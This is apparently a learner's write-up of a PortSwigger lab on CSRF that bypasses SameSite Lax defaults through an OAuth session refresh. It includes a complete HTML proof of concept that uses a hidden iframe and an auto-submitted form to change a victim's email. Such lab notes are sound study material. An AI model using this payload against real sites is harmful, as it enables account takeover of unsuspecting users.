# [SameSite Lax bypass via cookie refresh] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-09
 
---
 
## Vulnerability / core concept
Cross-site Request Forgery

## What made me stuck
I always try to solve labs without reading the content first in PortSwigger. The 120-second window for unset SameSite attribute was new to me.
 
## What unblocked me
After some time, I decided to read the content and learnt about 120-second window.
 
---


## Attack path
1) First we need to log in to have access to email functionality.
2) Login in this page is via oAuth, that creates a new session each time we login.
3) Using content from PortSwigger, we know that when SameSite attribute is not set, it is set to Lax by default and there is 120-seconds window during which cross-site POST requests are possible.
4) Therefore, we enforce the victim to open oAuth page first, so we can renew victim's session cookie value and gain that 120-seconds that we can use to exploit. Right after victim's opens oAuth page, we enforce victim to change his password using POST request.
5) All we have to do is to generate csrf PoC and deliver it to the victim, complete csrf attack and solve the lab.

---


## Payload / key command
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <script>
        // Step 1: Load the OAuth /auth endpoint in a hidden iframe
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'https://oauth-0a5a0047040232dd8001516a024d0010.oauth-server.net/auth?client_id=gvm0tqyswlxp398zxunxk&redirect_uri=https://0ae900db04e83275804853da005f00ae.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email';
        
        // Step 2: After iframe loads, submit the email change form
        iframe.onload = function() {
            document.getElementById('csrf-form').submit();
        };

        document.body.appendChild(iframe);
    </script>

    <!-- Step 2: Email change form, not auto-submitted yet -->
    <form id="csrf-form" action="https://0ae900db04e83275804853da005f00ae.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="babek@victim">
    </form>
</body>
</html>
```
As you can see, in this payload we first subtly make user to open oAuth page that will renew his session and give us 120-seconds window for cross-site POST requests. Right after the oAuth page loads, victim is enforced to submit POST request and change his email.

---


## What I'd recognize faster next time
If application has not set SameSite attribute and there is a gadget in that renews the session for user, there is a possibility to execute csrf attack by using 120-seconds window for cross-site POST requests.
 

